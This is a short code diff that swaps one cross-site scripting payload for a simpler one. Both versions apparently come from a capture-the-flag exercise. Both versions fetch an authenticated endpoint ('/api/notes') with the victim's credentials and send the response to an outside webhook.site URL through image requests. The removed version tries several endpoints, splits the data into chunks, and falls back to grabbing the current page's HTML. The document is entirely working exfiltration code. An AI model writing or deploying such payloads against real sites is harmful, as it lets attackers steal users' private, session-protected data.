@@ -1,32 +1,6 @@
 <script>
-  (async () => {
-    try {
-      // try a few likely admin endpoints; adjust/remove as needed
-      const endpoints = ['/api/notes'];
-      for (const ep of endpoints) {
-        try {
-          const r = await fetch(ep, { credentials: 'include' });
-          if (!r.ok) continue;
-          const text = await r.text();
-          if (text && text.length) {
-            // limit chunk size to ~1900 chars to avoid super-long URLs
-            const max = 1900;
-            for (let i = 0; i < text.length; i += max) {
-              new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?p='
-                + encodeURIComponent(ep) + '&i=' + (i/max)
-                + '&d=' + encodeURIComponent(text.slice(i, i+max));
-            }
-            return;
-          }
-        } catch(e) { /* ignore and try next endpoint */ }
-      }
-      // fallback: try to grab the current page HTML (if that contains flag)
-      try {
-        const r2 = await fetch(window.location.href, { credentials: 'include' });
-        const t2 = await r2.text();
-        new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?p=self&d='
-          + encodeURIComponent(t2.slice(0,1900));
-      } catch(e){}
-    } catch(e){}
-  })();
+ fetch('/api/notes', { credentials: 'include' })
+  .then(r=>r.text())
+  .then(t=> new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?d='+encodeURIComponent(t.slice(0,1900)))
+  .catch(e=> new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?err='+encodeURIComponent(String(e)));
 </script>
